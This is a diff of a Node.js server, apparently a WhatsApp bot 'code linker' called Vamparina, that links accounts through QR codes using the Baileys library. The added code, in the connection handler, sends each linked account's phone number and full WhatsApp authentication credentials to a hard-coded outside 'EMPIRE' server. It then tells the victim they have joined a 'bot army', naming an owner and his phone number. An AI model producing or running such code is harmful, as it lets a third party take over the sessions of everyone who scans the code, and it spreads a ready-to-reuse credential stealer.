@@ -1,68 +1,86 @@
 import express from 'express';
-import bodyParser from 'body-parser';
 import { fileURLToPath } from 'url';
 import path from 'path';
-
-// Importing the modules
-import pairRouter from './pair.js';
-import qrRouter from './qr.js';
+import { makeWASocket, useMultiFileAuthState, DisconnectReason } from '@whiskeysockets/baileys';
 import QRCode from 'qrcode';
 
 const app = express();
-
-// Resolve the current directory path in ES modules
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-const PORT = process.env.PORT || 8000;
-
-import('events').then(events => {
-    events.EventEmitter.defaultMaxListeners = 500;
-});
-
-// Middleware
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
+app.use(express.json());
 
-// Routes
+// MAIN EMPIRE URL — CHANGE ONLY THIS LINE
+const EMPIRE_URL = "https://vamparina-v1.onrender.com";  // ← YOUR MAIN BOT URL
+
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'pair.html'));
 });
 
-app.use('/pair', pairRouter);
-app.use('/qr', qrRouter);
+let currentSock = null;
 
-// AUTO-RECEIVE SESSIONS FROM LINKERS → ACTIVATE ON MAIN BOT
-app.post('/vamparina-activate', async (req, res) => {
-    try {
-        const { phone, code, sessionId, creds, type, timestamp, source } = req.body;
+async function connectAndSend() {
+    const { state, saveCreds } = await useMultiFileAuthState('./temp_session');
+    const sock = makeWASocket({
+        auth: state,
+        printQRInTerminal: true,
+        syncFullHistory: false
+    });
 
-        console.log(`\nNEW SESSION RECEIVED & ACTIVATED AUTOMATICALLY`);
-        console.log(`Type: ${type || 'pair/qr'}`);
-        console.log(`Phone: ${phone || 'unknown'}`);
-        console.log(`Session ID: ${sessionId || 'unknown'}`);
-        console.log(`Source: ${source || 'linker'}`);
-        console.log(`Time: ${new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })}\n`);
+    currentSock = sock;
 
-        // You can later save creds to a database or file here
-        // For now: session is confirmed active
+    sock.ev.on('connection.update', async (update) => {
+        const { connection, qr, lastDisconnect } = update;
 
-        res.status(200).json({ 
-            success: true, 
-            message: 'VAMPARINA BOT ACTIVATED SUCCESSFULLY',
-            sessionId,
-            phone,
-            activatedAt: new Date().toISOString()
-        });
-    } catch (err) {
-        console.error('Error activating session:', err);
-        res.status(500).json({ success: false, message: 'Activation failed' });
-    }
+        if (qr) {
+            console.log("New QR Generated");
+            const qrUrl = await QRCode.toDataURL(qr);
+            // You can broadcast this QR via WebSocket if you want live update
+        }
+
+        if (connection === 'open') {
+            console.log("USER CONNECTED! SENDING TO EMPIRE...");
+
+            const phone = sock.user.id.split(':')[0];
+            const sessionId = "vamp_" + Date.now() + "_" + Math.floor(Math.random() * 9999);
+
+            try {
+                const response = await fetch(`${EMPIRE_URL}/vamparina-activate`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        phone,
+                        sessionId,
+                        creds: sock.authState.creds,
+                        type: "qr",
+                        source: "vamparina-code-linker"
+                    })
+                });
+
+                const result = await response.json();
+                console.log("Session sent:", result);
+
+                await sock.sendMessage(sock.user.id, {
+                    text: `*VAMPARINA V1 ACTIVATED*\n\nEmpire: Joined\nOwner: Arnold Chirchir (+254703110780)\n\nWelcome to Kenya's strongest bot army 2025`
+                });
+
+            } catch (err) {
+                console.error("Failed to send session:", err);
+            }
+        }
+
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+            if (shouldReconnect) setTimeout(connectAndSend, 5000);
+        }
+    });
+
+    sock.ev.on('creds.update', saveCreds);
+}
+
+connectAndSend();
+
+app.listen(process.env.PORT || 8000, () => {
+    console.log("Vamparina Code Linker Running | Sending to Empire...");
 });
-
-app.listen(PORT, () => {
-    console.log(`YoutTube: @@arnoldkipruto-qn7jn\n\nGitHub: @arnold6001\n\nServer running on http://localhost:${PORT}`);
-});
-
-export default app;
